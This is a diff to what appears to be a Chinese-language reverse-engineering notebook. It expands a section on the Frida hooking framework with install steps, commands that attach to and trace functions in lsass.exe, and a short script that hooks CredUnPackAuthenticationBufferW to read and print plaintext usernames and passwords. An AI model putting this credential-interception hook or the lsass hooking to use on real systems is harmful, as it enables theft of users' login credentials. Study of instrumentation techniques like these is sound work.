@@ -1552,23 +1552,67 @@
 
 
 ## frida
-* 一款基于python + java 的hook框架, 可运行在android, ios, linux, win, osx等各平台, 主要使用动态二进制插桩技术. 
+* 参考
+    * https://frida.re/docs/home/
+    * [JavaScript API](https://frida.re/docs/javascript-api/)
+* 基本信息
+    * 一款基于python + java 的hook框架, 可运行在android, ios, linux, win, osx等各平台, 主要使用动态二进制插桩技术. 
+    * 安装: `pip install frida-tools`
 * 例: 
     ```sh
         # 附加到lsass进程. (cmd中失败, powershell则可)
         frida lsass.exe
+        
+        frida -p <进程id>
 
         # 加载脚本
         frida lsass.exe -l <xx.js>
 
-        # 跟踪函数
+        # 跟踪函数(可以用通配符). 控制台将会在进程调用这些函数时打印调用信息. 
         frida-trace lsass.exe -i RtlCompareMemory
 
         # 追踪库中的函数. 会在当前目录下新建一个`msv1_0.DLL/__handlers__`目录, 目录下各个js文件对应被hook的函数, 其中的onEnter和onLeave回调函数在被修改后会立刻生效. 
         frida-trace lsass.exe -I msv1_0.DLL
     ```
+* js/ts脚本
+    ```ts
+        // 获取库函数
+        // 方式一
+        const k32 = Process.getModuleByName('kernel32.dll');
+        const RtlCompareMemory = k32.getExportByName('RtlCompareMemory')
+
+        // 方式二
+        const RtlCompareMemory = Module.getExportByName('kernel32.dll', 'RtlCompareMemory'); 
+
+        Interceptor.attach(RtlCompareMemory, {
+            onEnter: function (args) { // `args`是参数列表
+            },
+            onLeave: function (retval) {
+                retval.replace(16); // 表示将返回值修改为16
+            },
+        });
+
+        var username;
+        var password;
+        var CredUnPackAuthenticationBufferW = Module.findExportByName("Credui.dll", "CredUnPackAuthenticationBufferW")
+
+        Interceptor.attach(CredUnPackAuthenticationBufferW, {
+            onEnter: function (args) {
+                username = args[3]; // LPWSTR pszUserName
+                password = args[7]; // LPWSTR pszPassword
+            },
+            onLeave: function (result) {
+                var user = username.readUtf16String()
+                var pass = password.readUtf16String() // 读取缓冲区中的明文口令
+
+                if (user && pass) {
+                    console.log("\n+ Intercepted Credentials\n" + user + ":" + pass)
+                }
+            }
+        });
+    ```
 * 分析
-    * 观察到frida注入到目标进程的模块有: `frida-agent.dll`, `ole32.dll`, `psapi.dll`, `shell32.dll`, `shlwapi.dll`, `winmm.dll`
+    * 观察到frida注入到目标进程的模块有: `frida-agent.dll` (新增模块: `advapi32.dll`, `combase.dll`, `crypt32.dll`, `dnsapi.dll`, `ole32.dll`, `psapi.dll`, `sechost.dll`, `shell32.dll`, `shlwapi.dll`, `winmm.dll`)
 
 ## api monitor
 
